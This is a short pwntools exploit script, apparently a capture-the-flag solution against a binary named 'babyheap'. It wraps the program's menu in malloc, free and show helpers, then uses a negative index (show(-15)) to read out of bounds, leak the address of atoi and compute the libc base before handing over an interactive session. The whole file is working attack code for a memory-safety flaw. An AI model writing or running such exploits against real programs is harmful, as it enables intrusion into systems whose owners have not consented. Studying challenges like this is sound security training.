from pwn import *
p = process("./babyheap")
elf = ELF("./babyheap")
libc = elf.libc

def malloc(size, content):
    p.sendlineafter("> ", "1")
    p.sendlineafter("size: ", str(size))
    p.sendlineafter("content: ", content)

def free(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("index: ", str(idx))

def show(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("index: ", str(idx))

show(-15)
libc_base = u64(p.recv(6) + "\x00\x00") - libc.symbols['atoi']
p.success("libc_base : " + hex(libc_base))
p.interactive()
